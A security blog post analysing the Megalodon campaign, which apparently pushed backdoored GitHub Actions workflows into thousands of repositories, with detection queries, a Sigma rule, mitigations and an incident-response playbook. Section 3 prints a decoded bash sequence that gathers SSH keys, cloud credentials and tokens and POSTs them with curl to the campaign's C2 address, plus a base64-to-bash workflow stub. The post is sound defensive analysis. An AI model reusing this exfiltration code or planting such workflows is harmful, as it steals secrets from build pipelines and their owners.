---
layout: post
title: "Megalodon: How a d-PPE Campaign Backdoored 5,561 GitHub Repositories in Six Hours"
date: 2026-06-15
categories: [supply-chain, security]
tags: [github-actions, ci-cd, poisoned-pipeline, supply-chain, credential-theft, dppe]
author: Prakhar Gupta
description: "A deep technical analysis of the Megalodon direct Poisoned Pipeline Execution campaign that injected malicious GitHub Actions workflows into 5,561 open-source repositories, harvesting cloud credentials, SSH keys, and OIDC tokens at scale."
toc: true
---

> **TL;DR for analysts and <span class="glossary-term" data-bs-toggle="tooltip" title="Incident Response. The structured set of activities an organization undertakes to identify, contain, eradicate, and recover from a security incident.">IR</span> teams.**
> On May 18, 2026, the Megalodon campaign injected backdoored <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> workflow files into **5,561 open-source repositories** within a single six-hour window, using forged bot commits to bypass human review. The payload — a base64-encoded bash script hidden inside `.github/workflows/SysDiag.yml` or `Optimize-Build.yml` — harvested AWS/GCP/Azure credentials, SSH keys, <span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span> tokens, Kubernetes configs, npm/PyPI tokens, and Docker registry auth on every subsequent pipeline run, exfiltrating everything to <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> at `216.126.225.129:8443`.
> The technique is **direct Poisoned Pipeline Execution (d-PPE)**, mapped to <span class="glossary-term" data-bs-toggle="tooltip" title="A globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.">MITRE ATT&CK</span> T1195.002. The single most important structural control is **mandatory pull request review on the default branch**: without it, any account with write access can land a malicious workflow with no human gate. If your pipelines run on repositories without that protection today, rotate credentials and audit `.github/workflows/` for `SysDiag.yml`, `Optimize-Build.yml`, or any workflow file with internal name `SysDiag` or `Optimize-Build`. Block outbound connections to `216[.]126[.]225[.]129` at the network perimeter immediately.

---

## Watch the 6-Minute Walkthrough

<!-- VIDEO_EMBED:START -->
<!--
  The Security Blog Automator pipeline replaces this block with the rendered
  <iframe> after NotebookLM Cinematic Video Overview generation completes.
  Source script: _video/script-megalodon-github-actions-dppe-deep-dive.md
-->
<div class="video-embed-placeholder" style="position:relative;padding-top:56.25%;background:#0b1220;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#cfd8e3;font-family:system-ui,sans-serif;">
  <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;padding:1rem;">
    <strong>Video rendering in progress.</strong><br/>
    A narrated walkthrough of this article will appear here once the publishing pipeline completes the NotebookLM video step.
  </div>
</div>
<!-- VIDEO_EMBED:END -->

---

## 1. Context: Why CI/CD Is the New Crown Jewels

Software delivery pipelines sit at an uncomfortable intersection: they need broad access to everything they build, sign, test, and deploy, yet they are routinely managed with less security rigour than the production environments they feed. A <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> runner, by default, can reach any secret injected into the repository, mint short-lived cloud identity tokens via <span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span>, and make arbitrary outbound network connections. That combination — wide credential access plus outbound internet — makes CI a dream target.

The Megalodon campaign, attributed to an as-yet-unidentified <span class="glossary-term" data-bs-toggle="tooltip" title="An individual or a group of individuals that takes action to cause a malicious incident, or to pose a threat to the security of an organization&#39;s network.">threat actor</span> and tracked since its discovery on May 18, 2026 by researchers at SafeDep and independently confirmed by StepSecurity and OX Security, is the most operationally significant demonstration of this threat class to date. In under six hours, a single coordinated push wave delivered malicious workflow files to **5,561 GitHub repositories**, with **5,718 malicious commits** catalogued in SafeDep's public dataset `megalodon-campaign-commits.csv`. Every one of those repositories became a credential harvesting node, exfiltrating data on the next pipeline execution.

This is not a novel vulnerability in GitHub itself. There are no CVEs. What Megalodon exploits is a structural gap that has existed since <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> launched: the absence of mandatory code review on workflow YAML files in the majority of public repositories.

---

## 2. Attack Technique: Direct Poisoned Pipeline Execution (d-PPE)

### 2.1 What is d-PPE?

Poisoned Pipeline Execution describes a class of CI/CD attack where an adversary causes the CI system to execute attacker-controlled commands by modifying pipeline definition files. There are two variants:

**Indirect PPE (i-PPE):** The attacker submits a pull request from a fork. The malicious workflow runs if the repository is configured to execute workflows from untrusted forks — a misconfiguration, but one that requires a PR to be visible and potentially reviewed.

**Direct PPE (d-PPE):** The attacker has write access to the default branch and pushes the malicious workflow file directly. No pull request is created. No review is triggered. The CI system picks up the new workflow on the next event (push, schedule, or workflow_dispatch) and executes it with full repository-scoped permissions.

Megalodon is a textbook d-PPE attack. It maps to **<span class="glossary-term" data-bs-toggle="tooltip" title="A globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.">MITRE ATT&CK</span> T1195.002** (Supply Chain Compromise: Compromise Software Supply Chain). The prerequisite — write access to the default branch — was met either through compromised contributor accounts or by exploiting repositories where open contributor models permitted direct pushes.

### 2.2 Attack Topology

![Diagram](https://kroki.io/mermaid/svg/eNpVkkFvnDAQhe_5FXPqpcqi0O2qjapIBJJl00NWAakHaw_GDGABNrLHSYj48XXMKkosjebgN9-8Z7k1fOqgzC7An4QlRFz0aP5UJroRWpHRw4A1cCG0U2RPcHl5szTatAhCj6OkoKw0gaxRkaR5gVtWci8g2EvKXQVPOOkgUxoqw5XoYDKaUJDU6hQ23wbu5GwHxWwzydvNPA5hiDTU2HA30Hl4gZRtWkmdq6IXbfpm0C82Wjlp4Ch8JXiHRVZ0WLsBAwmfvUMgI9sWjV0gY2eDSXBi4ckphWYlZYFUo9A1wnfAVxRrVG5xtwXffAo-D5rXC9yx1GDIzwfIuXlGSyvm7h0D9yz5V0T79Bglb874p_Nq-1mwZ0WRQ4-z9bt6V_m1qpHtZ0nOHg9ZCqR7VF9mD0xNY3Scj4cvl_fwDfa-cl-HEKZ9k5PH52V5LOD4WJQLPLA0vob4are5inebOP7p--_rX9vtjxXyEAYtaW84uD5nrN04LfD347-AVI3hlowT5AOeLv4DODu-yQ==)

### 2.3 Commit Forgery Mechanics

Each malicious commit was crafted to impersonate a legitimate CI bot, with three layers of camouflage:

**Forged author identities:**
- `build-bot@github-ci.com`
- `ci-pipeline@actions-bot.com`
- `ci-bot@automated.dev`
- `build-system@noreply.dev`

**Commit messages designed to blend into high-velocity repos:**
- `ci: add build optimization step`
- `chore: optimize pipeline runtime`
- `chore: update ci/cd pipeline`

**Backdated timestamp:** Every commit carries a hardcoded date of **September 17, 2001** — a technique previously observed in the TeamPCP campaign where a future date (January 2099) was used. The intent is the same: push the commit off the default git log view so casual repository owners scanning recent activity won't see it.

The workflow files themselves use innocuous filenames (`ci.yml`, `docker-community-worker-push-latest.yml`, `SysDiag.yml`, `Optimize-Build.yml`) and set an internal `name:` field to `SysDiag` or `Optimize-Build` — strings that sound plausibly like CI optimisation tooling to a maintainer who glances at the Actions tab.

---

## 3. Payload Deep Dive

### 3.1 Delivery Mechanism

The malicious workflow is a standard <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> YAML file. It triggers on `push` and `schedule` events (ensuring execution on the next commit to any branch, and periodically thereafter). The payload itself is never visible as readable bash — it lives entirely inside a `run:` step as a base64-encoded string that is decoded and piped to `bash` inline:

```yaml
name: SysDiag
on: [push, schedule]
jobs:
  diagnostics:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - name: Run system diagnostics
        run: |
          echo "Q0I9Imh0dHA6Ly8yMTYu..." | base64 -d | bash
```

The `id-token: write` permission is explicitly requested, enabling the payload to mint <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> <span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span> tokens that authenticate directly to cloud providers without requiring stored static credentials. The `contents: read` permission allows access to repository secrets scoped to the workflow context.

The base64 payload prefix `Q0I9Imh0dHA6Ly8yMTYu` (which decodes to the beginning of the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> URL assignment) is the primary signature for detecting infected workflow files at scale. OX Security's search of GitHub code confirmed over 3,500 YAML files carrying this exact prefix.

### 3.2 Credential and Secret Harvesting

Once decoded and executed, the payload performs a systematic sweep of the runner environment:

**Environment-level collection:**
- Full CI environment variable dump (`env`)
- `/proc/1/environ` (PID 1 environment, capturing secrets injected by the runner process itself)
- `/proc/*/environ` across all running processes

**Cloud provider credentials:**
- `aws configure list-profiles` + `~/.aws/credentials` and `~/.aws/config`
- GCP <span class="glossary-term" data-bs-toggle="tooltip" title="An open standard for access delegation. Lets a user grant a third-party application limited access to their resources without sharing credentials.">OAuth</span> access tokens from `~/.config/gcloud/`
- Azure <span class="glossary-term" data-bs-toggle="tooltip" title="Instance Metadata Service. The link-local HTTP endpoint (169.254.169.254 on AWS and Azure, metadata.google.internal on GCP) that hands out cloud credentials to workloads running on a VM.">IMDS</span> endpoint (`169.254.169.254`) for instance metadata and managed identity tokens

**Authentication material:**
- SSH private keys (`~/.ssh/id_*`)
- Docker registry auth (`~/.docker/config.json`)
- npm tokens (`~/.npmrc`)
- PyPI tokens (`~/.pypirc`)
- Kubernetes cluster config (`~/.kube/config`)
- HashiCorp Vault tokens (`~/.vault-token`)
- Terraform credentials (`~/.terraform.d/credentials.tfrc.json`)

**CI/CD-specific tokens:**
- <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> <span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span> tokens (minted live via the `id-token: write` permission)
- `GITHUB_TOKEN`, `ACTIONS_ID_TOKEN_REQUEST_TOKEN`
- GitLab CI/CD job tokens (`CI_JOB_TOKEN`)
- Bitbucket pipeline tokens

**Filesystem secret grepping** — a base64-encoded regex pattern covering 30+ secret patterns including:
- AWS key patterns (`AKIA[0-9A-Z]{16}`)
- Slack tokens (`xox[baprs]-`)
- GitHub personal access tokens (`ghp_`, `gho_`, `ghs_`, `ghu_`)
- Generic high-entropy strings in `.env`, `credentials.json`, `service-account.json`

### 3.3 Exfiltration

All harvested material is compressed into a gzip archive and sent via a single HTTPS POST to the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> server, with the campaign identifier `megalodon` embedded as a URL parameter:

```bash
# Representative decoded exfiltration sequence
DATA=$(env; cat /proc/1/environ 2>/dev/null; \
  cat ~/.ssh/id_* 2>/dev/null; \
  cat ~/.aws/credentials 2>/dev/null; \
  cat ~/.kube/config 2>/dev/null; \
  cat ~/.npmrc 2>/dev/null; \
  aws configure list-profiles 2>/dev/null; \
  grep -rE "(AKIA[0-9A-Z]{16}|xox[baprs]-|ghp_[A-Za-z0-9]+)" . 2>/dev/null)

echo "$DATA" | gzip | curl -s -X POST \
  "https://216.126.225.129:8443/collect?c=megalodon" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @-
```

The runner's outbound internet access is unrestricted in the vast majority of public repository configurations. No crash, no visible error — the workflow step exits cleanly with a zero exit code. The runner environment is ephemeral and discarded after the job, leaving no persistent forensic trace on the host.

---

## 4. Why Standard Defences Don't Catch This

| Control | Why it fails against Megalodon |
|---|---|
| Secret scanning (GitHub Advanced Security) | Scans for secrets *committed to code*, not secrets *exfiltrated at runtime* |
| Dependabot / <span class="glossary-term" data-bs-toggle="tooltip" title="Software Composition Analysis. Tooling that inventories third-party packages in a codebase and matches them against vulnerability and compromise feeds.">SCA</span> | Analyses dependency manifests — workflow YAML is out of scope |
| SAST on pull requests | No PR was created; d-PPE bypasses the PR gate entirely |
| <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub repository setting that gates which actors and commit shapes are allowed to update a protected branch. Bypass-actor allow-lists are a recurring source of supply-chain compromise.">Branch protection</span> (without required reviews) | Push protection without mandatory review allows direct workflow injection |
| Network monitoring (application layer) | Standard egress monitoring rarely extends to ephemeral CI runner environments |
| Runtime <span class="glossary-term" data-bs-toggle="tooltip" title="Endpoint Detection and Response. A class of security tooling that records process, file, network, and identity events on endpoints for hunting, alerting, and response.">EDR</span> on self-hosted runners | Applies only to self-hosted runners — GitHub-hosted runners are outside <span class="glossary-term" data-bs-toggle="tooltip" title="Endpoint Detection and Response. A class of security tooling that records process, file, network, and identity events on endpoints for hunting, alerting, and response.">EDR</span> scope |
| npm audit / pip audit | Focuses on *imported* dependencies, not workflow-injected bash |
| Repository secret rotation policy | Doesn't help if the runner harvests <span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span> tokens and live environment variables |

The gap is structural: workflow YAML files carry the same execution authority as application code, but receive systematically less security scrutiny. Most organisations have SAST, <span class="glossary-term" data-bs-toggle="tooltip" title="Software Composition Analysis. Tooling that inventories third-party packages in a codebase and matches them against vulnerability and compromise feeds.">SCA</span>, and secret scanning wired into their PR pipeline — none of those gates apply to a direct commit to the default branch.

---

## 5. Detection

### 5.1 GitHub Repository Audit (Immediate)

Search for infected workflow files using the base64 payload signature, workflow name fields, and forged commit metadata:

```
# GitHub code search — infected YAML by payload prefix
https://github.com/search?q=Q0I9Imh0dHA6Ly8yMTYu&type=code

# By internal workflow name
https://github.com/search?q=%22name%3A+SysDiag%22+path%3A.github%2Fworkflows&type=code
https://github.com/search?q=%22name%3A+Optimize-Build%22+path%3A.github%2Fworkflows&type=code

# Forged commit authors
https://github.com/search?q=author-email%3Abuild-bot%40github-ci.com&type=commits
https://github.com/search?q=author-email%3Aci-pipeline%40actions-bot.com&type=commits

# Anchor commit hash (Tiledesk)
https://github.com/search?q=acac5a9854650c4ae2883c4740bf87d34120c038&type=commits
```

SafeDep's full dataset of 5,718 malicious commits is available as `megalodon-campaign-commits.csv` for bulk cross-referencing against your organisation's repository inventory.

### 5.2 Defender Detection: GitHub Audit Log Query

For organisations using GitHub Enterprise with audit log streaming to a SIEM, the following query surfaces workflow file pushes to default branches from non-human actor identities — the pattern Megalodon used:

```kql
// GitHub Audit Log — KQL (Sentinel / Log Analytics)
// Detects workflow YAML pushed directly to default branch by bot-like identities
GitHubAuditLog
| where TimeGenerated > ago(14d)
| where Action == "git.push"
| extend WorkflowPath = tostring(parse_json(Data).ref)
| where WorkflowPath has ".github/workflows"
| extend ActorEmail = tostring(parse_json(Data).actor_email)
| where ActorEmail has_any (
    "build-bot@github-ci.com",
    "ci-pipeline@actions-bot.com",
    "ci-bot@automated.dev",
    "build-system@noreply.dev",
    "github-ci.com",
    "actions-bot.com",
    "automated.dev"
  )
| project TimeGenerated, Repo = tostring(parse_json(Data).repository),
    Actor = tostring(parse_json(Data).actor),
    ActorEmail, WorkflowPath,
    CommitId = tostring(parse_json(Data).head_sha)
| order by TimeGenerated desc
```

For pipeline egress monitoring, any CI runner making an outbound HTTPS POST to `216.126.225.129` is a confirmed infection indicator:

```kql
// Network egress from CI runners to known Megalodon C2
// Applicable to self-hosted runner networks with flow logging
CommonSecurityLog
| where TimeGenerated > ago(30d)
| where DestinationIP == "216.126.225.129"
| where DestinationPort == 8443
| project TimeGenerated, SourceIP, SourceHostname,
    DestinationIP, DestinationPort, Protocol,
    RequestMethod, RequestURL
| order by TimeGenerated desc
```

### 5.3 Sigma Rule: Suspicious Workflow Commit Pattern

```yaml
title: Megalodon d-PPE Workflow Injection
id: a3f7c1d4-9b2e-4f8a-bc3d-6e1a7f2d9c4b
status: experimental
description: Detects direct push of GitHub Actions workflow files matching Megalodon campaign IOCs
references:
  - https://www.stepsecurity.io/blog/megalodon-mass-github-actions-secret-exfiltration-across-5-500-public-repositories
  - https://www.ox.security/blog/megalodon-cicd-malware-github/
logsource:
  category: github_audit
  product: github
detection:
  selection_action:
    action: 'git.push'
  selection_path:
    target_path|contains: '.github/workflows'
  selection_actor:
    actor_email|endswith:
      - '@github-ci.com'
      - '@actions-bot.com'
      - '@automated.dev'
  condition: selection_action and selection_path and selection_actor
falsepositives:
  - Legitimate automation bots with similar email domain patterns
level: high
tags:
  - attack.t1195.002
  - supply_chain
```

---

## 6. Mitigation

### 6.1 Enforce Branch Protection with Required Reviews

This is the single structural control that converts d-PPE to the harder i-PPE problem. Without it, Megalodon's entire attack chain collapses at step one.

**Via GitHub UI:** Settings → Branches → <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub repository setting that gates which actors and commit shapes are allowed to update a protected branch. Bypass-actor allow-lists are a recurring source of supply-chain compromise.">Branch protection</span> rules → Require a pull request before merging → Require approvals (minimum 1) → Include administrators.

**Via GitHub API (PowerShell):**

```powershell
$headers = @{
    Authorization = "Bearer $env:GITHUB_TOKEN"
    Accept = "application/vnd.github+json"
    "X-GitHub-Api-Version" = "2022-11-28"
}

$body = @{
    required_pull_request_reviews = @{
        required_approving_review_count = 1
        dismiss_stale_reviews = $true
        require_code_owner_reviews = $true
    }
    restrictions = $null
    enforce_admins = $true
    required_status_checks = @{
        strict = $true
        contexts = @()
    }
} | ConvertTo-Json -Depth 5

Invoke-RestMethod `
    -Uri "https://api.github.com/repos/ORG/REPO/branches/main/protection" `
    -Method Put `
    -Headers $headers `
    -Body $body `
    -ContentType "application/json"
```

**Via <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> Workflow (enforce at org level using GitHub CLI):**

```yaml
name: Enforce Branch Protection
on:
  schedule:
    - cron: '0 6 * * 1'  # Weekly Monday audit
  workflow_dispatch:

jobs:
  enforce-protection:
    runs-on: ubuntu-latest
    steps:
      - name: Apply branch protection to all org repos
        env:
          GH_TOKEN: ${{ secrets.ORG_ADMIN_TOKEN }}
        run: |
          gh api graphql -f query='
            query($org: String!) {
              organization(login: $org) {
                repositories(first: 100) {
                  nodes { name defaultBranchRef { name } }
                }
              }
            }' -f org="$ORG_NAME" \
            --jq '.data.organization.repositories.nodes[].name' | \
          while read repo; do
            gh api \
              --method PUT \
              repos/$ORG_NAME/$repo/branches/main/protection \
              --input branch-protection.json || true
          done
```

### 6.2 Pin Workflow Actions to Commit SHAs

Referencing actions by tag (e.g. `actions/checkout@v4`) means a compromised tag can silently swap in malicious code. Pin to immutable commit SHAs:

```yaml
# Instead of:
- uses: actions/checkout@v4

# Pin to SHA:
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

Tools like [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) and `pin-github-action` can automate this across a repository.

### 6.3 Restrict OIDC Token Minting and Outbound Network Access

The `id-token: write` permission should be granted at the job level only for jobs that genuinely need cloud authentication. Restrict it in your default permissions:

```yaml
# At workflow top level — deny by default
permissions:
  contents: read
  id-token: none

jobs:
  deploy:
    # Grant only where needed
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: eu-west-1
```

For self-hosted runners, use StepSecurity Harden-Runner or egress firewall rules to restrict outbound connections to an allowlist, blocking unexpected POSTs to arbitrary IPs.

### 6.4 Immediate IOC Blocklist

Block the following at your network perimeter and in any CI runner egress policy:

| Type | Value | Note |
|---|---|---|
| IP | `216.126.225.129` | Megalodon <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> server |
| Port | `8443` | <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> HTTPS port |
| Commit email | `build-bot@github-ci.com` | Forged author |
| Commit email | `ci-pipeline@actions-bot.com` | Forged author |
| Commit email | `ci-bot@automated.dev` | Forged author |
| Commit email | `build-system@noreply.dev` | Forged author |
| File | `.github/workflows/SysDiag.yml` | Mass variant |
| File | `.github/workflows/Optimize-Build.yml` | Targeted variant |
| Base64 string | `Q0I9Imh0dHA6Ly8yMTYu` | Payload prefix |

---

## 7. IR Playbook

If you suspect a repository in your organisation's inventory was hit, follow this triage sequence:

### 7.1 Timeline Diagram

![Diagram](https://kroki.io/mermaid/svg/eNp1lMtu2zAQRff5itkESOEE8SNZxDvBaWMDCWDERrseSyNpYIlUSUqu-_Ud6kE_2nInWj6cOXeoDJVzNyDLsSsIPijDQidaweoT1gUed1rvYcslFayofTFBR9-0KdHBcjkvy3YTf7HtN2-X89uPm3bXUuxYWFvDmBHcbUdjcBq2o9n4S_vCQquUTQklFhyzri0ctNmnhT5AylJOZciSctCteWzY3YMb38Nzd-wqkV85PcKuQOseDCYsDEOVtsAKtMngbM3d5B4wdWRaxmTcQRY5xXuIdVmygxxtDpghK-tggym9UuVbRkuuh0z_BXkl2SnFEXB6auKAFqjxrxrOMjKUDJXMAmTSQS6EiRcnJZS-9zuvq9P20mv7pFI39D9rFi5Xry0-NT871f1Jjd4ToErAaCfRQvT-7usw5FqHmKZSlBTeWR1gQYLHTgdYT_ixgT0dLYzgbbGGTTQ8Rb9rQ7BZg9CTEyu48NTJ80Vhb-yW9Q7W0dZ2RdIDW1vTXz0-BchZdyvViCM_sbDZLH0ZUCGba0MB8nwNuUhliUbmjVXmM3npM5k-9aF8VbiTkd0ZVHEuk6td_7cDu1zq_lmzaTU2TAdpPg95-GMHhWuvvChOiWILsf6wfkQ3yyg0MM9DEJ43C6lambjYAScPTjSq-UFUy33yM2ptCzxvPA8ReN40zHRV6CNQJrfQyunKGV1YkJZMrRRda5znIQPPm13r-06GU46xfbhrzY06dVGdSF991FHfsJwBhc4spNrAYjqUIec0wZw_ceh5Ueg62Rrk4tFPHbZMAfTGWwwqLZfG35hovYJYREsQTVDYnCkcPk1Kg6rKx_VR_lBhvJcPmYVKs9VK0kz0QT4UhrAUTpDY9BL_AEtinR0=)

### 7.2 Credential Rotation Priority Order

1. **<span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span>-derived cloud tokens** — If `id-token: write` was present, assume short-lived cloud tokens were minted and used. Review CloudTrail (AWS), Cloud Audit Logs (GCP), and Microsoft Entra <span class="glossary-term" data-bs-toggle="tooltip" title="The Entra ID audit table recording every interactive authentication event. Companion to AADNonInteractiveUserSignInLogs which records back-end token usage.">sign-in logs</span> for API calls from the runner IP range in the window following the malicious workflow execution.

2. **Static cloud credentials** — Rotate AWS IAM access keys, GCP service account keys, and Azure <span class="glossary-term" data-bs-toggle="tooltip" title="The local identity object created in an Entra tenant that represents an application instance. Required for assigning users and permissions to applications.">service principal</span> secrets immediately. Do not wait for CloudTrail analysis to complete before rotating.

3. **SSH keys** — Any key pair accessible from `~/.ssh/` on the runner or loaded via `ssh-agent` is compromised. Revoke from all target systems (GitHub, production servers, bastion hosts) before rotating.

4. **Package registry tokens** — If npm or PyPI tokens were present, check publish logs for unexpected package versions. The Tiledesk compromise (npm `@tiledesk/tiledesk-server` versions 2.18.6–2.18.12) demonstrates the downstream blast radius — poisoned packages propagate to consumers via normal dependency resolution.

5. **Repository secrets and GITHUB_TOKEN derivatives** — Rotate all repository and organisation secrets. Re-issue GitHub PATs. Check for any repository Actions runs that consumed the GITHUB_TOKEN in the window after compromise.

---

## 8. The Wider Picture

Megalodon sits in a line of escalating CI/CD supply chain attacks that began gaining serious operational momentum with the 2023 Codecov breach and the 2025 `tj-actions/changed-files` incident (which itself originated from a Coinbase-targeted campaign). The pattern is consistent: attackers find a trust boundary that defenders haven't formalised — in this case, workflow YAML treated as configuration rather than code — and operate there at scale before detection catches up.

Two trends make the next wave more dangerous than Megalodon:

**<span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span> token abuse is underdetected.** Static credential theft is well understood; <span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span>-derived session tokens are not. The runner mints a token valid for 15–60 minutes, uses it to call cloud APIs, and the token expires before most <span class="glossary-term" data-bs-toggle="tooltip" title="Incident Response. The structured set of activities an organization undertakes to identify, contain, eradicate, and recover from a security incident.">IR</span> teams think to check. CloudTrail and GCP audit logs do record these calls, but attribution to a specific CI run requires correlating runner IP ranges with API call timestamps — a join that most SIEM deployments don't have pre-built.

**Open-source maintainer fatigue creates the access.** Most of the 5,561 affected repositories are maintained by individuals or small teams with no security budget. <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub repository setting that gates which actors and commit shapes are allowed to update a protected branch. Bypass-actor allow-lists are a recurring source of supply-chain compromise.">Branch protection</span> is a free GitHub feature, but enabling and configuring it across dozens of repositories is friction that many maintainers never get to. Enterprise consumers of these packages are downstream victims of a security posture they can't directly influence — which is why <span class="glossary-term" data-bs-toggle="tooltip" title="Software Composition Analysis. Tooling that inventories third-party packages in a codebase and matches them against vulnerability and compromise feeds.">SCA</span> tooling that understands *pipeline health*, not just package vulnerabilities, is becoming a necessary part of the dependency risk picture.

For Cloud Security Engineering teams: the Megalodon IOCs are well documented and the detection is achievable today. The structural fix — mandatory PR reviews on workflow files — is a 15-minute configuration change. The harder problem is building organisation-wide visibility into which repositories in your extended supply chain (the open-source packages your build systems consume) have that protection in place. That's the gap this campaign just made very visible.

---

## Glossary

**d-PPE (direct Poisoned Pipeline Execution):** An attack technique where an adversary with write access to a repository's default branch injects malicious CI/CD pipeline definition files directly, without creating a pull request, causing the CI system to execute attacker-controlled commands on the next pipeline trigger.

**i-PPE (indirect Poisoned Pipeline Execution):** A variant of PPE where the attacker submits a pull request from a forked repository. Execution depends on the target repository's fork PR workflow permissions.

**<span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span> (OpenID Connect) token:** A short-lived, scoped identity token minted by a CI provider (e.g. <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span>) that allows a pipeline to authenticate to a cloud provider (AWS, GCP, Azure) without storing static credentials. Requires `id-token: write` permission in the <span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> workflow.

**<span class="glossary-term" data-bs-toggle="tooltip" title="GitHub&#39;s CI/CD platform. Workflows triggered by repository events run on hosted or self-hosted runners and often carry secrets with broad cloud-account access.">GitHub Actions</span> workflow:** A YAML file stored in `.github/workflows/` that defines CI/CD automation. Workflows run on GitHub-hosted or self-hosted runners and have access to repository secrets, environment variables, and (if permitted) <span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span> token minting.

**<span class="glossary-term" data-bs-toggle="tooltip" title="GitHub repository setting that gates which actors and commit shapes are allowed to update a protected branch. Bypass-actor allow-lists are a recurring source of supply-chain compromise.">Branch protection</span> rule:** A GitHub repository setting that restricts who can push to a branch and under what conditions (e.g. requiring pull request reviews, required status checks, signed commits). Without it, any account with write access can push directly.

**<span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span> token exfiltration:** The act of stealing a freshly minted <span class="glossary-term" data-bs-toggle="tooltip" title="OpenID Connect. An identity layer on top of OAuth 2.0 used widely (including by GitHub Actions) to federate trust between identity providers and cloud platforms without long-lived credentials.">OIDC</span> token during CI execution and using it to make authenticated API calls to cloud providers from an attacker-controlled machine before the token expires.

**ATT&CK T1195.002:** <span class="glossary-term" data-bs-toggle="tooltip" title="A globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.">MITRE ATT&CK</span> technique for Supply Chain Compromise: Compromise Software Supply Chain — the injection of malicious code into software build pipelines or package distribution mechanisms.

